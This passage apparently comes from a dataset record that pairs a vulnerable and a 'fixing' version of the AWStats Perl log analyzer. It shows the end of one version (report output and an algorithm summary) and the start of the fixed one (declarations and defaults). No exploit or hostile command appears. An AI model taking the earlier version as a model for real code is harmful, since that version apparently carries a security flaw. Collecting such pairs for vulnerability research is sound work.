$NewLinkTarget);\n\t\t}\n\n\t\t# BY BROWSER\n\t\t#----------------------------\n\t\tif ($ShowBrowsersStats) {\n\t\t\t&HTMLMainBrowsers($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SCREEN SIZE\n\t\t#----------------------------\n\t\tif ($ShowScreenSizeStats) {\n\t\t\t&HTMLMainScreenSize();\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"refering\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY REFERENCE\n\t\t#---------------------------\n\t\tif ($ShowOriginStats) {\n\t\t\t&HTMLMainReferrers($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\tprint \"\\n<a name=\\\"keys\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY SEARCH KEYWORDS AND/OR KEYPHRASES\n\t\t#-------------------------------------\n\t\tif ($ShowKeyphrasesStats || $ShowKeywordsStats){\n\t\t\t&HTMLMainKeys($NewLinkParams, $NewLinkTarget);\n\t\t}\t\n\n\t\tprint \"\\n<a name=\\\"other\\\">&nbsp;</a>\\n\\n\";\n\n\t\t# BY MISC\n\t\t#----------------------------\n\t\tif ($ShowMiscStats) {\n\t\t\t&HTMLMainMisc();\n\t\t}\n\n\t\t# BY HTTP STATUS\n\t\t#----------------------------\n\t\tif ($ShowHTTPErrorsStats) {\n\t\t\t&HTMLMainHTTPStatus($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY SMTP STATUS\n\t\t#----------------------------\n\t\tif ($ShowSMTPErrorsStats) {\n\t\t\t&HTMLMainSMTPStatus($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY CLUSTER\n\t\t#----------------------------\n\t\tif ($ShowClusterStats) {\n\t\t\t&HTMLMainCluster($NewLinkParams, $NewLinkTarget);\n\t\t}\n\n\t\t# BY EXTRA SECTIONS\n\t\t#----------------------------\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\t&HTMLMainExtra($NewLinkParams, $NewLinkTarget, $extranum);\n\t\t}\n\n\t\t# close the HTML page\n\t\t&html_end(1);\n\t}\n}\nelse {\n\tprint \"Jumped lines in file: $lastlinenb\\n\";\n\tif ($lastlinenb) { print \" Found $lastlinenb already parsed records.\\n\"; }\n\tprint \"Parsed lines in file: $NbOfLinesParsed\\n\";\n\tprint \" Found $NbOfLinesDropped dropped records,\\n\";\n\tprint \" Found $NbOfLinesComment comments,\\n\";\n \tprint \" Found $NbOfLinesBlank blank records,\\n\";\n\tprint \" Found $NbOfLinesCorrupted corrupted records,\\n\";\n\tprint \" Found $NbOfOldLines old records,\\n\";\n\tprint \" Found $NbOfNewLines new qualified records.\\n\";\n}\n\n\n#sleep 10;\n\n0;    # Do not remove this line\n\n#-------------------------------------------------------\n# ALGORITHM SUMMARY\n#\n# Read_Config();\n# Check_Config() and Init variables\n# if 'frame not index'\n#\t&Read_Language_Data($Lang);\n#\tif 'frame not mainleft'\n#\t\t&Read_Ref_Data();\n#\t\t&Read_Plugins();\n# html_head\n#\n# If 'migrate'\n#   We create/update tmp file with\n#     &Read_History_With_TmpUpdate(year,month,day,hour,UPDATE,NOPURGE,\"all\");\n#   Rename the tmp file\n#   html_end\n#   Exit\n# End of 'migrate'\n#\n# Get last history file name\n# Get value for $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum with\n#\t&Read_History_With_TmpUpdate(lastyearbeforeupdate,lastmonthbeforeupdate,lastdaybeforeupdate,lasthourbeforeupdate,NOUPDATE,NOPURGE,\"general\");\n#\n# &Init_HashArray()\n#\n# If 'update'\n#   Loop on each new line in log file\n#     lastlineoffset=lastlineoffsetnext; lastlineoffsetnext=file pointer position\n#     If line corrupted, skip --> next on loop\n#\t  Drop wrong virtual host --> next on loop\n#     Drop wrong method/protocol --> next on loop\n#     Check date --> next on loop\n#     If line older than $LastLine, skip --> next on loop\n#     So it's new line\n#     $LastLine = time or record\n#     Skip if url is /robots.txt --> next on loop\n#     Skip line for @SkipHosts --> next on loop\n#     Skip line for @SkipFiles --> next on loop\n#     Skip line for @SkipUserAgent --> next on loop\n#     Skip line for not @OnlyHosts --> next on loop\n#     Skip line for not @OnlyUsers --> next on loop\n#     Skip line for not @OnlyFiles --> next on loop\n#     Skip line for not @OnlyUserAgent --> next on loop\n#     So it's new line approved\n#     If other month/year, create/update tmp file and purge data arrays with\n#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_));\n#     Define a clean Url and Query (set urlwithnoquery, tokenquery and standalonequery and $field[$pos_url])\n#     Define PageBool and extension\n#     Analyze: Misc tracker --> complete %misc\n#     Analyze: Hit on favorite icon --> complete %_misc, countedtraffic=1 (not counted anywhere)\n#     If (!countedtraffic) Analyze: Worms --> complete %_worms, countedtraffic=2\n#     If (!countedtraffic) Analyze: Status code --> complete %_error_, %_sider404, %_referrer404 --> countedtraffic=3\n#     If (!countedtraffic) Analyze: Robots known --> complete %_robot, countedtraffic=4\n#     If (!countedtraffic) Analyze: Robots unknown on robots.txt --> complete %_robot, countedtraffic=5\n#     If (!countedtraffic) Analyze: File types - Compression\n#     If (!countedtraffic) Analyze: Date - Hour - Pages - Hits - Kilo\n#     If (!countedtraffic) Analyze: Login\n#     If (!countedtraffic) Do DNS Lookup\n#     If (!countedtraffic) Analyze: Country\n#     If (!countedtraffic) Analyze: Host - Url - Session\n#     If (!countedtraffic) Analyze: Browser - OS\n#     If (!countedtraffic) Analyze: Referer\n#     If (!countedtraffic) Analyze: EMail\n#     Analyze: Cluster\n#     Analyze: Extra (must be after 'Define a clean Url and Query')\n#     If too many records, we flush data arrays with\n#       &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_));\n#   End of loop\n#\n#   Create/update tmp file\n#\t  Seek to lastlineoffset in logfile to read and get last line into $_\n#\t  &Read_History_With_TmpUpdate(lastprocessedyear,lastprocessedmonth,lastprocessedday,lastprocessedhour,UPDATE,PURGE,\"all\",lastlinenb,lastlineoffset,CheckSum($_))\n#   Rename all created tmp files\n# End of 'update'\n#\n# &Init_HashArray()\n#\n# If 'output'\n#   Loop for each month of required year\n#     &Read_History_With_TmpUpdate($YearRequired,$monthloop,'','',NOUPDATE,NOPURGE,'all' or 'general time' if not required month)\n#   End of loop\n#   Show data arrays in HTML page\n#   html_end\n# End of 'output'\n#-------------------------------------------------------\n\n#-------------------------------------------------------\n# DNS CACHE FILE FORMATS SUPPORTED BY AWSTATS\n# Format /etc/hosts     x.y.z.w hostname\n# Format analog         UT/60 x.y.z.w hostname\n#-------------------------------------------------------\n\n#-------------------------------------------------------\n# IP Format (d=decimal on 16 bits, x=hexadecimal on 16 bits)\n#\n# 13.1.68.3\t\t\t\t\t\tIPv4 (d.d.d.d)\n# 0:0:0:0:0:0:13.1.68.3 \t\tIPv6 (x:x:x:x:x:x:d.d.d.d)\n# ::13.1.68.3\n# 0:0:0:0:0:FFFF:13.1.68.3 \t\tIPv6 (x:x:x:x:x:x:d.d.d.d)\n# ::FFFF:13.1.68.3 \t\t\t\tIPv6\n#\n# 1070:0:0:0:0:800:200C:417B \tIPv6\n# 1070:0:0:0:0:800:200C:417B \tIPv6\n# 1070::800:200C:417B \t\t\tIPv6\n#-------------------------------------------------------\n"], "fixing_code": ["#!/usr/bin/perl\n#------------------------------------------------------------------------------\n# Free realtime web server logfile analyzer to show advanced web statistics.\n# Works from command line or as a CGI. You must use this script as often as\n# necessary from your scheduler to update your statistics and from command\n# line or a browser to read report results.\n# See AWStats documentation (in docs/ directory) for all setup instructions.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n#------------------------------------------------------------------------------\nrequire 5.007;\n\n#$|=1;\n#use warnings;\t\t# Must be used in test mode only. This reduce a little process speed\n#use diagnostics;\t# Must be used in test mode only. This reduce a lot of process speed\nuse strict;\nno strict \"refs\";\nuse Time::Local\n  ; # use Time::Local 'timelocal_nocheck' is faster but not supported by all Time::Local modules\nuse Socket;\nuse Encode;\nuse File::Spec;\n\n\n#------------------------------------------------------------------------------\n# Defines\n#------------------------------------------------------------------------------\nuse vars qw/ $REVISION $VERSION /;\n$REVISION = '20161204';\n$VERSION  = \"7.7 (build $REVISION)\";\n\n# ----- Constants -----\nuse vars qw/\n  $DEBUGFORCED $NBOFLINESFORBENCHMARK $FRAMEWIDTH $NBOFLASTUPDATELOOKUPTOSAVE\n  $LIMITFLUSH $NEWDAYVISITTIMEOUT $VISITTIMEOUT $NOTSORTEDRECORDTOLERANCE\n  $WIDTHCOLICON $TOOLTIPON\n  $lastyearbeforeupdate $lastmonthbeforeupdate $lastdaybeforeupdate $lasthourbeforeupdate $lastdatebeforeupdate\n  $NOHTML\n  /;\n$DEBUGFORCED = 0\n  ; # Force debug level to log lesser level into debug.log file (Keep this value to 0)\n$NBOFLINESFORBENCHMARK = 8192\n  ; # Benchmark info are printing every NBOFLINESFORBENCHMARK lines (Must be a power of 2)\n$FRAMEWIDTH = 240;    # Width of left frame when UseFramesWhenCGI is on\n$NBOFLASTUPDATELOOKUPTOSAVE =\n  500;                # Nb of records to save in DNS last update cache file\n$LIMITFLUSH =\n  5000;   # Nb of records in data arrays after how we need to flush data on disk\n$NEWDAYVISITTIMEOUT = 764041;    # Delay between 01-23:59:59 and 02-00:00:00\n$VISITTIMEOUT       = 10000\n  ; # Lapse of time to consider a page load as a new visit. 10000 = 1 hour (Default = 10000)\n$NOTSORTEDRECORDTOLERANCE = 20000\n  ; # Lapse of time to accept a record if not in correct order. 20000 = 2 hour (Default = 20000)\n$WIDTHCOLICON = 32;\n$TOOLTIPON    = 0;    # Tooltips plugin loaded\n$NOHTML       = 0;    # Suppress the html headers\n\n# ----- Running variables -----\nuse vars qw/\n  $DIR $PROG $Extension\n  $Debug $ShowSteps\n  $DebugResetDone $DNSLookupAlreadyDone\n  $RunAsCli $UpdateFor $HeaderHTTPSent $HeaderHTMLSent\n  $LastLine $LastLineNumber $LastLineOffset $LastLineChecksum $LastUpdate\n  $lowerval\n  $PluginMode\n  $MetaRobot\n  $AverageVisits $AveragePages $AverageHits $AverageBytes\n  $TotalUnique $TotalVisits $TotalHostsKnown $TotalHostsUnknown\n  $TotalPages $TotalHits $TotalBytes $TotalHitsErrors\n  $TotalNotViewedPages $TotalNotViewedHits $TotalNotViewedBytes\n  $TotalEntries $TotalExits $TotalBytesPages $TotalDifferentPages\n  $TotalKeyphrases $TotalKeywords $TotalDifferentKeyphrases $TotalDifferentKeywords\n  $TotalSearchEnginesPages $TotalSearchEnginesHits $TotalRefererPages $TotalRefererHits $TotalDifferentSearchEngines $TotalDifferentReferer\n  $FrameName $Center $FileConfig $FileSuffix $Host $YearRequired $MonthRequired $DayRequired $HourRequired\n  $QueryString $SiteConfig $StaticLinks $PageCode $PageDir $PerlParsingFormat $UserAgent\n  $pos_vh $pos_host $pos_logname $pos_date $pos_tz $pos_method $pos_url $pos_code $pos_size\n  $pos_referer $pos_agent $pos_query $pos_gzipin $pos_gzipout $pos_compratio $pos_timetaken\n  $pos_cluster $pos_emails $pos_emailr $pos_hostr @pos_extra\n  /;\n$DIR = $PROG = $Extension = '';\n$Debug          = $ShowSteps            = 0;\n$DebugResetDone = $DNSLookupAlreadyDone = 0;\n$RunAsCli       = $UpdateFor            = $HeaderHTTPSent = $HeaderHTMLSent = 0;\n$LastLine = $LastLineNumber = $LastLineOffset = $LastLineChecksum = 0;\n$LastUpdate          = 0;\n$lowerval            = 0;\n$PluginMode          = '';\n$MetaRobot           = 0;\n$AverageVisits = $AveragePages = $AverageHits = $AverageBytes = 0; \n$TotalUnique         = $TotalVisits = $TotalHostsKnown = $TotalHostsUnknown = 0;\n$TotalPages          = $TotalHits = $TotalBytes = $TotalHitsErrors = 0;\n$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;\n$TotalEntries = $TotalExits = $TotalBytesPages = $TotalDifferentPages = 0;\n$TotalKeyphrases = $TotalKeywords = $TotalDifferentKeyphrases = 0;\n$TotalDifferentKeywords = 0;\n$TotalSearchEnginesPages = $TotalSearchEnginesHits = $TotalRefererPages = 0;\n$TotalRefererHits = $TotalDifferentSearchEngines = $TotalDifferentReferer = 0;\n(\n\t$FrameName,    $Center,       $FileConfig,        $FileSuffix,\n\t$Host,         $YearRequired, $MonthRequired,     $DayRequired,\n\t$HourRequired, $QueryString,  $SiteConfig,        $StaticLinks,\n\t$PageCode,     $PageDir,      $PerlParsingFormat, $UserAgent\n  )\n  = ( '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '' );\n\n# ----- Plugins variable -----\nuse vars qw/ %PluginsLoaded $PluginDir $AtLeastOneSectionPlugin /;\n%PluginsLoaded           = ();\n$PluginDir               = '';\n$AtLeastOneSectionPlugin = 0;\n\n# ----- Time vars -----\nuse vars qw/\n  $starttime\n  $nowtime $tomorrowtime\n  $nowweekofmonth $nowweekofyear $nowdaymod $nowsmallyear\n  $nowsec $nowmin $nowhour $nowday $nowmonth $nowyear $nowwday $nowyday $nowns\n  $StartSeconds $StartMicroseconds\n  /;\n$StartSeconds = $StartMicroseconds = 0;\n\n# ----- Variables for config file reading -----\nuse vars qw/\n  $FoundNotPageList\n  /;\n$FoundNotPageList = 0;\n\n# ----- Config file variables -----\nuse vars qw/\n  $StaticExt\n  $DNSStaticCacheFile\n  $DNSLastUpdateCacheFile\n  $MiscTrackerUrl\n  $Lang\n  $MaxRowsInHTMLOutput\n  $MaxLengthOfShownURL\n  $MaxLengthOfStoredURL\n  $MaxLengthOfStoredUA\n  %BarPng\n  $BuildReportFormat\n  $BuildHistoryFormat\n  $ExtraTrackedRowsLimit\n  $DatabaseBreak\n  $SectionsToBeSaved\n  /;\n$StaticExt              = 'html';\n$DNSStaticCacheFile     = 'dnscache.txt';\n$DNSLastUpdateCacheFile = 'dnscachelastupdate.txt';\n$MiscTrackerUrl         = '/js/awstats_misc_tracker.js';\n$Lang                   = 'auto';\n$SectionsToBeSaved      = 'all';\n$MaxRowsInHTMLOutput    = 1000;\n$MaxLengthOfShownURL    = 64;\n$MaxLengthOfStoredURL = 256;  # Note: Apache LimitRequestLine is default to 8190\n$MaxLengthOfStoredUA  = 256;\n%BarPng               = (\n\t'vv' => 'vv.png',\n\t'vu' => 'vu.png',\n\t'hu' => 'hu.png',\n\t'vp' => 'vp.png',\n\t'hp' => 'hp.png',\n\t'he' => 'he.png',\n\t'hx' => 'hx.png',\n\t'vh' => 'vh.png',\n\t'hh' => 'hh.png',\n\t'vk' => 'vk.png',\n\t'hk' => 'hk.png'\n);\n$BuildReportFormat     = 'html';\n$BuildHistoryFormat    = 'text';\n$ExtraTrackedRowsLimit = 500;\n$DatabaseBreak         = 'month';\nuse vars qw/\n  $DebugMessages $AllowToUpdateStatsFromBrowser $EnableLockForUpdate $DNSLookup $DynamicDNSLookup $AllowAccessFromWebToAuthenticatedUsersOnly\n  $BarHeight $BarWidth $CreateDirDataIfNotExists $KeepBackupOfHistoricFiles\n  $NbOfLinesParsed $NbOfLinesDropped $NbOfLinesCorrupted $NbOfLinesComment $NbOfLinesBlank $NbOfOldLines $NbOfNewLines\n  $NbOfLinesShowsteps $NewLinePhase $NbOfLinesForCorruptedLog $PurgeLogFile $ArchiveLogRecords\n  $ShowDropped $ShowCorrupted $ShowUnknownOrigin $ShowDirectOrigin $ShowLinksToWhoIs\n  $ShowAuthenticatedUsers $ShowFileSizesStats $ShowScreenSizeStats $ShowSMTPErrorsStats\n  $ShowEMailSenders $ShowEMailReceivers $ShowWormsStats $ShowClusterStats\n  $IncludeInternalLinksInOriginSection\n  $AuthenticatedUsersNotCaseSensitive\n  $Expires $UpdateStats $MigrateStats $URLNotCaseSensitive $URLWithQuery $URLReferrerWithQuery\n  $DecodeUA $DecodePunycode\n  /;\n(\n\t$DebugMessages,\n\t$AllowToUpdateStatsFromBrowser,\n\t$EnableLockForUpdate,\n\t$DNSLookup,\n\t$DynamicDNSLookup,\n\t$AllowAccessFromWebToAuthenticatedUsersOnly,\n\t$BarHeight,\n\t$BarWidth,\n\t$CreateDirDataIfNotExists,\n\t$KeepBackupOfHistoricFiles,\n\t$NbOfLinesParsed,\n\t$NbOfLinesDropped,\n\t$NbOfLinesCorrupted,\n\t$NbOfLinesComment,\n\t$NbOfLinesBlank,\n\t$NbOfOldLines,\n\t$NbOfNewLines,\n\t$NbOfLinesShowsteps,\n\t$NewLinePhase,\n\t$NbOfLinesForCorruptedLog,\n\t$PurgeLogFile,\n\t$ArchiveLogRecords,\n\t$ShowDropped,\n\t$ShowCorrupted,\n\t$ShowUnknownOrigin,\n\t$ShowDirectOrigin,\n\t$ShowLinksToWhoIs,\n\t$ShowAuthenticatedUsers,\n\t$ShowFileSizesStats,\n\t$ShowScreenSizeStats,\n\t$ShowSMTPErrorsStats,\n\t$ShowEMailSenders,\n\t$ShowEMailReceivers,\n\t$ShowWormsStats,\n\t$ShowClusterStats,\n\t$IncludeInternalLinksInOriginSection,\n\t$AuthenticatedUsersNotCaseSensitive,\n\t$Expires,\n\t$UpdateStats,\n\t$MigrateStats,\n\t$URLNotCaseSensitive,\n\t$URLWithQuery,\n\t$URLReferrerWithQuery,\n\t$DecodeUA,\n\t$DecodePunycode\n  )\n  = (\n\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n  );\nuse vars qw/\n  $DetailedReportsOnNewWindows\n  $FirstDayOfWeek $KeyWordsNotSensitive $SaveDatabaseFilesWithPermissionsForEveryone\n  $WarningMessages $ShowLinksOnUrl $UseFramesWhenCGI\n  $ShowMenu $ShowSummary $ShowMonthStats $ShowDaysOfMonthStats $ShowDaysOfWeekStats\n  $ShowHoursStats $ShowDomainsStats $ShowHostsStats\n  $ShowRobotsStats $ShowSessionsStats $ShowPagesStats $ShowFileTypesStats $ShowDownloadsStats\n  $ShowOSStats $ShowBrowsersStats $ShowOriginStats\n  $ShowKeyphrasesStats $ShowKeywordsStats $ShowMiscStats $ShowHTTPErrorsStats $ShowHTTPErrorsPageDetail\n  $AddDataArrayMonthStats $AddDataArrayShowDaysOfMonthStats $AddDataArrayShowDaysOfWeekStats $AddDataArrayShowHoursStats\n  /;\n(\n\t$DetailedReportsOnNewWindows,\n\t$FirstDayOfWeek,\n\t$KeyWordsNotSensitive,\n\t$SaveDatabaseFilesWithPermissionsForEveryone,\n\t$WarningMessages,\n\t$ShowLinksOnUrl,\n\t$UseFramesWhenCGI,\n\t$ShowMenu,\n\t$ShowSummary,\n\t$ShowMonthStats,\n\t$ShowDaysOfMonthStats,\n\t$ShowDaysOfWeekStats,\n\t$ShowHoursStats,\n\t$ShowDomainsStats,\n\t$ShowHostsStats,\n\t$ShowRobotsStats,\n\t$ShowSessionsStats,\n\t$ShowPagesStats,\n\t$ShowFileTypesStats,\n\t$ShowDownloadsStats,\n\t$ShowOSStats,\n\t$ShowBrowsersStats,\n\t$ShowOriginStats,\n\t$ShowKeyphrasesStats,\n\t$ShowKeywordsStats,\n\t$ShowMiscStats,\n\t$ShowHTTPErrorsStats,\n\t$ShowHTTPErrorsPageDetail,\n\t$AddDataArrayMonthStats,\n\t$AddDataArrayShowDaysOfMonthStats,\n\t$AddDataArrayShowDaysOfWeekStats,\n\t$AddDataArrayShowHoursStats\n  )\n  = (\n\t1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,\n\t1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1\n  );\nuse vars qw/\n  $AllowFullYearView\n  $LevelForRobotsDetection $LevelForWormsDetection $LevelForBrowsersDetection $LevelForOSDetection $LevelForRefererAnalyze\n  $LevelForFileTypesDetection $LevelForSearchEnginesDetection $LevelForKeywordsDetection\n  /;\n(\n\t$AllowFullYearView,          $LevelForRobotsDetection,\n\t$LevelForWormsDetection,     $LevelForBrowsersDetection,\n\t$LevelForOSDetection,        $LevelForRefererAnalyze,\n\t$LevelForFileTypesDetection, $LevelForSearchEnginesDetection,\n\t$LevelForKeywordsDetection\n  )\n  = ( 2, 2, 0, 2, 2, 2, 2, 2, 2 );\nuse vars qw/\n  $DirLock $DirCgi $DirConfig $DirData $DirIcons $DirLang $AWScript $ArchiveFileName\n  $AllowAccessFromWebToFollowingIPAddresses $HTMLHeadSection $HTMLEndSection $LinksToWhoIs $LinksToIPWhoIs\n  $LogFile $LogType $LogFormat $LogSeparator $Logo $LogoLink $StyleSheet $WrapperScript $SiteDomain\n  $UseHTTPSLinkForUrl $URLQuerySeparators $URLWithAnchor $ErrorMessages $ShowFlagLinks\n  $AddLinkToExternalCGIWrapper\n  /;\n(\n\t$DirLock,                                  $DirCgi,\n\t$DirConfig,                                $DirData,\n\t$DirIcons,                                 $DirLang,\n\t$AWScript,                                 $ArchiveFileName,\n\t$AllowAccessFromWebToFollowingIPAddresses, $HTMLHeadSection,\n\t$HTMLEndSection,                           $LinksToWhoIs,\n\t$LinksToIPWhoIs,                           $LogFile,\n\t$LogType,                                  $LogFormat,\n\t$LogSeparator,                             $Logo,\n\t$LogoLink,                                 $StyleSheet,\n\t$WrapperScript,                            $SiteDomain,\n\t$UseHTTPSLinkForUrl,                       $URLQuerySeparators,\n\t$URLWithAnchor,                            $ErrorMessages,\n\t$ShowFlagLinks,                            $AddLinkToExternalCGIWrapper\n  )\n  = (\n\t'', '', '', '', '', '', '', '', '', '', '', '', '', '',\n\t'', '', '', '', '', '', '', '', '', '', '', '', '', '', ''\n  );\nuse vars qw/\n  $color_Background $color_TableBG $color_TableBGRowTitle\n  $color_TableBGTitle $color_TableBorder $color_TableRowTitle $color_TableTitle\n  $color_text $color_textpercent $color_titletext $color_weekend $color_link $color_hover $color_other\n  $color_h $color_k $color_p $color_e $color_x $color_s $color_u $color_v\n  /;\n(\n\t$color_Background,   $color_TableBG,     $color_TableBGRowTitle,\n\t$color_TableBGTitle, $color_TableBorder, $color_TableRowTitle,\n\t$color_TableTitle,   $color_text,        $color_textpercent,\n\t$color_titletext,    $color_weekend,     $color_link,\n\t$color_hover,        $color_other,       $color_h,\n\t$color_k,            $color_p,           $color_e,\n\t$color_x,            $color_s,           $color_u,\n\t$color_v\n  )\n  = (\n\t'', '', '', '', '', '', '', '', '', '', '', '',\n\t'', '', '', '', '', '', '', '', '', ''\n  );\n\n# ---------- Init arrays --------\nuse vars qw/\n  @RobotsSearchIDOrder_list1 @RobotsSearchIDOrder_list2 @RobotsSearchIDOrder_listgen\n  @SearchEnginesSearchIDOrder_list1 @SearchEnginesSearchIDOrder_list2 @SearchEnginesSearchIDOrder_listgen\n  @BrowsersSearchIDOrder @OSSearchIDOrder @WordsToCleanSearchUrl\n  @WormsSearchIDOrder\n  @RobotsSearchIDOrder @SearchEnginesSearchIDOrder\n  @_from_p @_from_h\n  @_time_p @_time_h @_time_k @_time_nv_p @_time_nv_h @_time_nv_k\n  @DOWIndex @fieldlib @keylist\n  /;\n@RobotsSearchIDOrder = @SearchEnginesSearchIDOrder = ();\n@_from_p = @_from_h = ();\n@_time_p = @_time_h = @_time_k = @_time_nv_p = @_time_nv_h = @_time_nv_k = ();\n@DOWIndex = @fieldlib = @keylist = ();\nuse vars qw/\n  @MiscListOrder %MiscListCalc\n  %OSFamily %BrowsersFamily @SessionsRange %SessionsAverage\n  %LangBrowserToLangAwstats %LangAWStatsToFlagAwstats %BrowsersSafariBuildToVersionHash\n  @HostAliases @AllowAccessFromWebToFollowingAuthenticatedUsers\n  @DefaultFile @SkipDNSLookupFor\n  @SkipHosts @SkipUserAgents @SkipFiles @SkipReferrers @NotPageFiles\n  @OnlyHosts @OnlyUserAgents @OnlyFiles @OnlyUsers\n  @URLWithQueryWithOnly @URLWithQueryWithout\n  @ExtraName @ExtraCondition @ExtraStatTypes @MaxNbOfExtra @MinHitExtra\n  @ExtraFirstColumnTitle @ExtraFirstColumnValues @ExtraFirstColumnFunction @ExtraFirstColumnFormat\n  @ExtraCodeFilter @ExtraConditionType @ExtraConditionTypeVal\n  @ExtraFirstColumnValuesType @ExtraFirstColumnValuesTypeVal\n  @ExtraAddAverageRow @ExtraAddSumRow\n  @PluginsToLoad\n  /;\n@MiscListOrder = (\n\t'AddToFavourites',  'JavascriptDisabled',\n\t'JavaEnabled',      'DirectorSupport',\n\t'FlashSupport',     'RealPlayerSupport',\n\t'QuickTimeSupport', 'WindowsMediaPlayerSupport',\n\t'PDFSupport'\n);\n%MiscListCalc = (\n\t'TotalMisc'                 => '',\n\t'AddToFavourites'           => 'u',\n\t'JavascriptDisabled'        => 'hm',\n\t'JavaEnabled'               => 'hm',\n\t'DirectorSupport'           => 'hm',\n\t'FlashSupport'              => 'hm',\n\t'RealPlayerSupport'         => 'hm',\n\t'QuickTimeSupport'          => 'hm',\n\t'WindowsMediaPlayerSupport' => 'hm',\n\t'PDFSupport'                => 'hm'\n);\n@SessionsRange =\n  ( '0s-30s', '30s-2mn', '2mn-5mn', '5mn-15mn', '15mn-30mn', '30mn-1h', '1h+' );\n%SessionsAverage = (\n\t'0s-30s',   15,  '30s-2mn',   75,   '2mn-5mn', 210,\n\t'5mn-15mn', 600, '15mn-30mn', 1350, '30mn-1h', 2700,\n\t'1h+',      3600\n);\n\n# HTTP-Accept or Lang parameter => AWStats code to use for lang\n# ISO-639-1 or 2 or other       => awstats-xx.txt where xx is ISO-639-1\n%LangBrowserToLangAwstats = (\n\t'sq'    => 'al',\n\t'ar'    => 'ar',\n\t'ba'    => 'ba',\n\t'bg'    => 'bg',\n\t'zh-tw' => 'tw',\n\t'zh'    => 'cn',\n\t'cs'    => 'cz',\n\t'de'    => 'de',\n\t'da'    => 'dk',\n\t'en'    => 'en',\n\t'et'    => 'et',\n\t'fi'    => 'fi',\n\t'fr'    => 'fr',\n\t'gl'    => 'gl',\n\t'es'    => 'es',\n\t'eu'    => 'eu',\n\t'ca'    => 'ca',\n\t'el'    => 'gr',\n\t'hu'    => 'hu',\n\t'is'    => 'is',\n\t'in'    => 'id',\n\t'it'    => 'it',\n\t'ja'    => 'jp',\n\t'kr'    => 'ko',\n\t'lv'    => 'lv',\n\t'nl'    => 'nl',\n\t'no'    => 'nb',\n\t'nb'    => 'nb',\n\t'nn'    => 'nn',\n\t'pl'    => 'pl',\n\t'pt'    => 'pt',\n\t'pt-br' => 'br',\n\t'ro'    => 'ro',\n\t'ru'    => 'ru',\n\t'sr'    => 'sr',\n\t'sk'    => 'sk',\n\t'sv'    => 'se',\n\t'th'    => 'th',\n\t'tr'    => 'tr',\n\t'uk'    => 'ua',\n\t'cy'    => 'cy',\n\t'wlk'   => 'cy'\n);\n%LangAWStatsToFlagAwstats =\n  (  # If flag (country ISO-3166 two letters) is not same than AWStats Lang code\n\t'ca' => 'es_cat',\n\t'et' => 'ee',\n\t'eu' => 'es_eu',\n\t'cy' => 'wlk',\n\t'gl' => 'glg',\n\t'he' => 'il',\n\t'ko' => 'kr',\n\t'ar' => 'sa',\n\t'sr' => 'cs'\n  );\n\n@HostAliases = @AllowAccessFromWebToFollowingAuthenticatedUsers = ();\n@DefaultFile = @SkipDNSLookupFor = ();\n@SkipHosts = @SkipUserAgents = @NotPageFiles = @SkipFiles = @SkipReferrers = ();\n@OnlyHosts = @OnlyUserAgents = @OnlyFiles = @OnlyUsers = ();\n@URLWithQueryWithOnly     = @URLWithQueryWithout    = ();\n@ExtraName                = @ExtraCondition         = @ExtraStatTypes = ();\n@MaxNbOfExtra             = @MinHitExtra            = ();\n@ExtraFirstColumnTitle    = @ExtraFirstColumnValues = ();\n@ExtraFirstColumnFunction = @ExtraFirstColumnFormat = ();\n@ExtraCodeFilter = @ExtraConditionType = @ExtraConditionTypeVal = ();\n@ExtraFirstColumnValuesType = @ExtraFirstColumnValuesTypeVal = ();\n@ExtraAddAverageRow         = @ExtraAddSumRow                = ();\n@PluginsToLoad              = ();\n\n# ---------- Init hash arrays --------\nuse vars qw/\n  %BrowsersHashIDLib %BrowsersHashIcon %BrowsersHereAreGrabbers\n  %DomainsHashIDLib\n  %MimeHashLib %MimeHashFamily\n  %OSHashID %OSHashLib\n  %RobotsHashIDLib %RobotsAffiliateLib\n  %SearchEnginesHashID %SearchEnginesHashLib %SearchEnginesWithKeysNotInQuery %SearchEnginesKnownUrl %NotSearchEnginesKeys\n  %WormsHashID %WormsHashLib %WormsHashTarget\n  /;\nuse vars qw/\n  %HTMLOutput %NoLoadPlugin %FilterIn %FilterEx\n  %BadFormatWarning\n  %MonthNumLib\n  %ValidHTTPCodes %ValidSMTPCodes\n  %TrapInfosForHTTPErrorCodes %NotPageList %DayBytes %DayHits %DayPages %DayVisits\n  %MaxNbOf %MinHit\n  %ListOfYears %HistoryAlreadyFlushed %PosInFile %ValueInFile\n  %val %nextval %egal\n  %TmpDNSLookup %TmpOS %TmpRefererServer %TmpRobot %TmpBrowser %MyDNSTable\n  /;\n%HTMLOutput = %NoLoadPlugin = %FilterIn = %FilterEx = ();\n%BadFormatWarning           = ();\n%MonthNumLib                = ();\n%ValidHTTPCodes             = %ValidSMTPCodes = ();\n%TrapInfosForHTTPErrorCodes = 